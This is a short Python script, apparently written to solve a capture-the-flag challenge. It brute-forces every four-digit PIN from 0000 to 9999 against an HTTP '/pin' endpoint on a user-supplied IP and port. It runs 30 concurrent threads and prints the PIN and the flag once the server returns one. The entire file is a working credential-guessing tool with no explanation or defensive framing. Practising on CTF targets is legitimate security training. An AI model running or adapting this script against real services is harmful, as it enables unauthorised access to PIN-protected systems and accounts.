#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor

def check_pin(ip, port, pin, session):
    try:
        response = session.get(f"http://{ip}:{port}/pin?pin={pin}", timeout=2)
        if response.ok and 'flag' in response.json():
            return pin, response.json()['flag']
    except requests.exceptions.RequestException:
        pass
    return None, None

def brute(ip, port):
    max_threads = 30
    session = requests.Session()
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        # 0000~9999
        pins = [f"{n:04d}" for n in range(10000)]
        
        futures = {executor.submit(check_pin, ip, port, pin, session): pin for pin in pins}
        
        for future in futures:
            pin, flag = future.result()
            print(f"Attempted PIN: {futures[future]}", end='\r', flush=True)
            if flag:
                print(f"\nPIN found: {pin}")
                print(f"Flag: {flag}")
                executor.shutdown(wait=False)
                return

if __name__ == '__main__':
    target_ip = input("IP: ")
    target_port = int(input("Port: "))
    brute(target_ip, target_port)